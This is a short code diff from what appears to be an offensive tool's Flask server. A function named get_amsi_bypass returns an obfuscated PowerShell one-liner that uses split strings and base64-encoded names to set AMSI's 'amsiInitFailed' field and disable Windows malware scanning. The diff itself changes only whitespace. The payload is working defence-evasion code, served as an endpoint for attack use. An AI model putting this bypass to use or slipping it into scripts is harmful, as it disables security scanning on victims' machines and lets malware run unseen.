@@ -357,7 +357,7 @@ def get_amsi_bypass():
     """
     amsi_bypass = "[Ref].Assembly.GetType('System.Ma'+'nagement.Automa'+'tion.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAa'+'QBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBt'+'AHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPubl'+'ic,St'+'atic').SetValue($null,$true)"
     # TODO obfuscate
-    
+
     return flask.jsonify({
         'data': amsi_bypass
     })
